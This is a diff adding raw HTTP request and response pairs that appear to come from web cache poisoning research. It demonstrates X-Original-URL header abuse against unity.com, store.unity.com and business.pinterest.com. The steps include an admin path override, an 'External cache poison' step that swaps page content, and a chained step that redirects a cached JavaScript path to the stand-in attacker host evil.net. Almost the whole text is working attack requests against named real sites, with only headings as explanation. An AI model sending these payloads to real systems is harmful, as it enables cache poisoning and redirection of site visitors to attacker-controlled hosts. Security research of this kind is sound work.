@@ -1,0 +1,31 @@
+GET /anything HTTP/1.1
+Host: unity.com
+X-Original-URL: /admin
+------------------------
+HTTP/1.1 200 OK
+Please log in
+
+External cache poison (1/3)
+
+GET /education?x=y HTTP/1.1
+Host: store.unity.com
+X-Original-URL: /gambling?x=y
+----------------------------
+HTTP/1.1 200 OK
+Unity for Gambling
+
+
+Combining ingredients
+
+GET /foo.js?v=1 HTTP/1.1
+Host: business.pinterest.com
+----------------------------
+HTTP/1.1 302 Found
+Location: /foo.js
+
+GET /?destination=https://evil.net\@business.pinterest.com/
+Host: business.pinterest.com
+X-Original-URL: /foo.js?v=1
+----------------------------
+HTTP/1.1 302 Found
+Location: https://evil.net\@
